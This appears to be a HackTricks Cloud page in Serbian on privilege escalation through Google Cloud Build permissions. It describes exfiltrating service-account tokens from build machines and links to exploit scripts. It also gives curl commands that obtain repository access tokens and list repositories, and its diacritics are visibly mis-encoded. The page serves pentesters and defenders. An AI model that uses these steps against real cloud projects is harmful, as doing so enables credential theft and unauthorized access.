# GCP - Cloudbuild Privesc

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## cloudbuild

Za vi코e informacija o Cloud Build-u proverite:

{% content-ref url="../../gcp-pentesting/gcp-services/gcp-cloud-build-enum.md" %}
[gcp-cloud-build-enum.md](../../gcp-pentesting/gcp-services/gcp-cloud-build-enum.md)
{% endcontent-ref %}

### `cloudbuild.builds.create`

Sa ovla코캖enjem mo쬰te **poslati cloud build**. Cloudbuild ma코ina 캖e po **podrazumevanim pode코avanjima imati token cloudbuild Service Account-a**: `<PROJECT_NUMBER>@cloudbuild.gserviceaccount.com`. Me캠utim, mo쬰te **navesti bilo koji service account unutar projekta** u cloudbuild konfiguraciji.\
Stoga, mo쬰te jednostavno naterati ma코inu da izfiltrira token na va코 server ili **dobiti obrnutu ljusku unutar nje i sami preuzeti token** (fajl koji sadr쬴 token mo쬰 se promeniti).

Originalni skript za eksploataciju mo쬰te prona캖i [**ovde na GitHub-u**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py) (ali lokacija sa koje uzima token nije radila za mene). Stoga, proverite skriptu za automatizaciju [**kreiranja, eksploatacije i 캜i코캖enja ranjivog okru쬰nja ovde**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/f-cloudbuild.builds.create.sh) i python skriptu za dobijanje obrnute ljuske unutar cloudbuild ma코ine i [**preuzimanje tokena ovde**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/f-cloudbuild.builds.create.py) (u kodu mo쬰te prona캖i kako navesti druge service account-e)**.**

Za detaljnije obja코njenje, posetite [https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/](https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/)

### `cloudbuild.builds.update`

**Potencijalno** sa ovla코캖enjem mo쬰te **a쬿rirati cloud build i samo preuzeti token service account-a** kao 코to je ura캠eno sa prethodnim ovla코캖enjem (ali na쬬lost, u trenutku pisanja ovog teksta nisam prona코ao na캜in da pozovem tu API metodu).

TODO

### `cloudbuild.repositories.accessReadToken`

Sa ovla코캖enjem korisnik mo쬰 dobiti **token za 캜itanje pristupa** koji se koristi za pristupanje repozitorijumu:

{% code overflow="wrap" %}
```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadToken"
```
{% endcode %}

### `cloudbuild.repositories.accessReadWriteToken`

Sa ovom dozvolom korisnik mo쬰 dobiti **token za 캜itanje i pisanje** koji se koristi za pristupanje repozitorijumu:

{% code overflow="wrap" %}
```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadWriteToken"
```
{% endcode %}

### `cloudbuild.connections.fetchLinkableRepositories`

Sa ovom dozvolom mo쬰te **dobiti repozitorijume kojima veza ima pristup:**

{% code overflow="wrap" %}
```bash
curl -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>:fetchLinkableRepositories"
```
{% endcode %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
